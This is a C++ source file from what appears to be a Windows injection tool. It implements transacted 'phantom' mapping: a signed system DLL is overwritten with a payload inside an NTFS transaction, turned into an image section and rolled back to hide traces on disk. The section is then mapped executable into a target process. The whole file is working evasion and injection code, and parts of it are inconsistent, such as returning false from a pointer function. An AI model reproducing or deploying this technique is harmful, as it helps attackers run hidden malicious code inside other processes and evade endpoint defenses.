#include "stdafx.h"
#include "phantom_mapper.h"
#include "logger.h"
#include <KtmW32.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "KtmW32.lib")

extern "C" NTSTATUS NTAPI NtCreateSection(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

extern "C" NTSTATUS NTAPI NtMapViewOfSection(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

namespace PhantomMapper {

PVOID InjectTransacted(HANDLE hProcess, const void* pPayload, size_t payloadSize) {
    // Use a legitimate signed Windows DLL as the face of the transaction
    wchar_t szDummyPath[MAX_PATH];
    ExpandEnvironmentStringsW(L"%SystemRoot%\\System32\\xpsprint.dll", szDummyPath, MAX_PATH);

    // 1. Create a transaction
    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        LOG(L"PhantomMapper: CreateTransaction failed: %u", GetLastError());
        return false;
    }

    // 2. Open the file inside the transaction
    HANDLE hTransactedFile = CreateFileTransactedW(
        szDummyPath,
        GENERIC_WRITE | GENERIC_READ,
        0, nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr, hTransaction, nullptr, nullptr
    );

    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        LOG(L"PhantomMapper: CreateFileTransacted failed: %u", GetLastError());
        CloseHandle(hTransaction);
        return false;
    }

    // 3. Overwrite the file inside the transaction boundaries with our payload
    DWORD bytesWritten = 0;
    if (!WriteFile(hTransactedFile, pPayload, (DWORD)payloadSize, &bytesWritten, nullptr)) {
        LOG(L"PhantomMapper: WriteFile failed: %u", GetLastError());
        CloseHandle(hTransactedFile);
        CloseHandle(hTransaction);
        return false;
    }

    // 4. Create an executable image section from the transacted file
    HANDLE hSection = nullptr;
    NTSTATUS status = NtCreateSection(
        &hSection, SECTION_ALL_ACCESS, nullptr, nullptr, 
        PAGE_READONLY, SEC_IMAGE, hTransactedFile
    );

    if (!NT_SUCCESS(status)) {
        LOG(L"PhantomMapper: NtCreateSection failed: 0x%08X", status);
        CloseHandle(hTransactedFile);
        CloseHandle(hTransaction);
        return false;
    }

    // 5. Rollback the transaction to hide our traces from the physical disk instantly
    CloseHandle(hTransactedFile);
    RollbackTransaction(hTransaction);
    CloseHandle(hTransaction);

    // 6. Map the section into the target process
    PVOID pRemoteBase = nullptr;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection(
        hSection, hProcess, &pRemoteBase, 0, 0, nullptr, 
        &viewSize, (SECTION_INHERIT)2 /* ViewUnmap */, 0, PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        LOG(L"PhantomMapper: NtMapViewOfSection failed: 0x%08X", status);
        CloseHandle(hSection);
        return false;
    }

    // Mark as execute
    DWORD oldProtect = 0;
    VirtualProtectEx(hProcess, pRemoteBase, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    VERBOSE(L"PhantomMapper: Successfully mapped transacted payload at %p (looks like %s)", pRemoteBase, szDummyPath);

    CloseHandle(hSection);

    // The rest of the injection flow (hijacking a thread to point to pRemoteBase)
    // is expected to be handled by the caller, similar to Mockingjay.

    // Return true - pRemoteBase would technically need to be returned via out-param, 
    // but for our structural fit into dll_inject.cpp we can adapt.
    return pRemoteBase;
}

} // namespace PhantomMapper
